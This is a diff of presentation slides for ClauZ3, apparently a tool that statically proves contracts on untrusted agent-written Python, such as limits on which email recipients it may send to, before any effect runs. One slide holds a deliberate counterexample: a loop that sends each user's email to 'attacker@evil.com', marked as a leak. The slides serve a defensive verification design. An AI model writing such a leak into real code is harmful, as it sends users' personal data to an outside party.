@@ -330,29 +330,30 @@ for r in recipients:
 </section>
 
 <section>
-  <h2>deal: Python runtime contracts</h2>
-  <p><code>deal.readthedocs.io</code> — a contract library for Python.</p>
+  <h2>Background: deal runtime contracts</h2>
+  <p>ClauZ3 builds on <code>deal</code>. Its runtime API looks like this:</p>
   <pre><code class="language-python" data-trim>
+from pathlib import Path
 import deal
 
-@deal.pre(lambda addr, msg: "@" in addr)
-@deal.has("trusted")
-@deal.post(lambda result: result is None)
-def send_email(addr: str, msg: str) -> None:
-    ...
+@deal.pre(lambda path: len(path) > 0)
+@deal.has("read", "io")
+@deal.post(lambda result: len(result) <= 100)
+def read_preview(path: str) -> str:
+    return Path(path).read_text()[:100]
   </code></pre>
   <ul>
     <li><code>@deal.pre</code> — precondition (checked on call)</li>
     <li><code>@deal.post</code> — postcondition (checked on return)</li>
-    <li><code>@deal.has(...)</code> — declares a side-effect category</li>
+    <li><code>@deal.has(...)</code> — optional checks on a body's side effects</li>
   </ul>
 </section>
 
 <section>
-  <h2>deal is great. But it runs at runtime.</h2>
+  <h2>Runtime checks happen at the call</h2>
   <div class="cols">
     <div>
-      <h3>What deal can do</h3>
+      <h3>What runtime contracts do</h3>
       <ul>
         <li>Catch a bad call when it happens</li>
         <li>Document intent at the call site</li>
@@ -360,7 +361,7 @@ def send_email(addr: str, msg: str) -> None:
       </ul>
     </div>
     <div>
-      <h3>What deal can't do <em>before</em> running</h3>
+      <h3>What runtime checks alone cannot do</h3>
       <ul>
         <li>Catch the second email when the first already went out</li>
         <li>Reject a program with a hidden bad branch</li>
@@ -390,17 +391,20 @@ def send_email(addr: str, msg: str) -> None:
 
 <section>
   <h2>The idea</h2>
-  <p>Read deal's decorators <strong>statically</strong>, before any effect fires.</p>
+  <p>Declare trusted effects with ClauZ3; prove the caller's guarantees
+    <strong>before</strong> any effect fires.</p>
   <pre><code class="language-python" data-trim>
 # trusted layer (audited; the assumptions)
-@deal.pre(lambda addr, msg: "@" in addr)
-@deal.has("trusted")
-def send_email(addr: str, msg: str) -> None: ...
+import clauz3
 
+@clauz3.requires(lambda addr, msg: "@" in addr)
+@clauz3.trusted
+def send_email(addr: str, msg: str) -> None: ...
 
 # agent code (untrusted; the guarantees)
 import clauz3
 from tools.email.trusted import contracts as emails
+from tools.email.trusted.effects import send_email
 
 @clauz3.guarantee(emails.only(["bob@example.com"]))
 def main() -> None:
@@ -445,17 +449,18 @@ def main() -> None:
 
 <section>
   <h2>1 · A trusted email layer</h2>
-  <p>The TLE writes this once. The agent and prover both read it.</p>
+  <p>Relations name functions explicitly; <code>effect()</code> covers every trusted call.</p>
   <pre><code class="language-python" data-trim>
 # tools/email/trusted/effects.py
-@deal.pre(lambda addr, msg: "@" in addr, message='addr must contain "@"')
-@deal.has("trusted")
-def send_email(addr: str, msg: str) -> None:
-    ...
+import clauz3
+@clauz3.requires(lambda addr, msg: "@" in addr)
+@clauz3.trusted
+def send_email(addr: str, msg: str) -> None: ...
 
 # tools/email/trusted/contracts.py
-Email = effect("send_email")
-
+from clauz3.spec import ContractSpec, contract, effect
+from tools.email.trusted.effects import send_email
+Email = effect(send_email)
 @contract
 def only(addresses: list[str]) -> ContractSpec:
     return Email.all(lambda e: e.addr in addresses)
@@ -595,7 +600,8 @@ def main() -> None:
 
 <section>
   <h2>8 · Loops over typed query rows</h2>
-  <p>The prover unrolls the loop symbolically and binds <code>row.email</code> to a column of a schema.</p>
+  <p>The prover models each row using its schema. The trusted query declares
+    <code>@clauz3.ensures(lambda result: len(result) &lt;= 100)</code>.</p>
   <pre><code class="language-python" data-trim>
 @clauz3.guarantee(emails.addresses_from(UserRow, "email"))
 @clauz3.guarantee(emails.count_at_most(100))
@@ -605,6 +611,7 @@ def main() -> None:
   </code></pre>
   <p><span class="verdict pass">PROVED</span> every recipient is symbolically the <code>email</code> column of a <code>UserRow</code>.</p>
   <pre><code class="language-python" data-trim>
+@clauz3.guarantee(emails.addresses_from(UserRow, "email"))
 def main() -> None:
     for row in db_query("users"):
         send_email("attacker@evil.com", row.email)   # leak
@@ -650,8 +657,14 @@ def main() -> None:
   <p>The TLE declares what an agent <em>should</em> promise about a domain it uses.</p>
   <pre><code class="language-python" data-trim>
 # tools/email/trusted/policy.py
-required    = []                       # must be present, or proof fails
-recommended = ["only", "unique_recipients"]  # missing → UI badge, not block
+from clauz3.policy import domain_policy
+
+POLICY = domain_policy(
+    when_used="send_email",  # a trusted function name
+    required=[],            # obligations added to the proof
+    recommended=["only", "unique_recipients"],
+    label="email",
+)
   </code></pre>
   <p>The approval UI surfaces the gap:</p>
   <pre><code class="language-text" data-trim>
@@ -663,19 +676,19 @@ recommended = ["only", "unique_recipients"]  # missing → UI badge, not block
 </section>
 
 <section>
-  <h2>Runtime fallback is allowed</h2>
-  <p>Static proof is the default, not the only mode.</p>
+  <h2>Weaker contracts are an explicit choice</h2>
+  <p>The user can accept a weaker contract and retain the trusted layer's runtime checks.</p>
   <ul class="spaced">
-    <li>Some tasks are beyond any tractable static subset.</li>
+    <li>Some properties cannot yet be expressed by the contract language.</li>
     <li>An agent can declare <code>emails.no_guarantees()</code> or leave a
-      domain uncovered.</li>
+      domain uncovered, subject to required policies.</li>
     <li>If the user accepts <em>that</em> contract, it's a recorded shared decision.</li>
-    <li><strong>deal</strong>'s runtime preconditions still fire at the trusted
-      boundary. Same trusted layer, different posture.</li>
+    <li><code>@clauz3.requires</code> and <code>@clauz3.ensures</code> also
+      check calls and returns at runtime, through Deal.</li>
   </ul>
   <div class="callout">
-    Static when we can; runtime when the user accepts it.
-    We don't get in the way of that agreement.
+    <code>no_guarantees()</code> relaxes that claim. Preconditions and required
+    policies still apply; <code>clauz3 run</code> still requires a successful proof.
   </div>
 </section>
 
